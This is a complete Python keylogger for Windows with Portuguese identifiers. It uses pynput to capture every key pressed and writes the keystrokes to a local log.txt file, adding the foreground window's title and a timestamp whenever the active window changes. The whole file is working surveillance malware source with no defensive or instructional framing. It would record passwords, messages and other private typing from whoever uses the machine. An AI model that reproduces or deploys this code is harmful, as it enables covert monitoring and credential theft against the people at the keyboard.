import datetime
from pynput import keyboard
from win32gui import GetForegroundWindow, GetWindowText

ULTIMA_JANELA = None

def tecla_pressionada(tecla):
    global ULTIMA_JANELA
    
    with open("log.txt", "a", encoding="utf-8") as file:        
        janela = GetWindowText(GetForegroundWindow())
        if janela != ULTIMA_JANELA:
            ULTIMA_JANELA = janela
            file.write(f"\n\n\n##### {janela} - {datetime.datetime.now()} #####\n\n")
    
        try:
            if tecla.vk >= 96 and tecla.vk <= 105:
                tecla = tecla.vk - 96
        except:
            pass
        
        tecla = str(tecla).replace("'", "")
 
        if len(tecla) > 1:
            tecla = f" [{tecla}] "
            
        file.write(tecla)     


with keyboard.Listener(on_press=tecla_pressionada) as escutar:
    escutar.join()
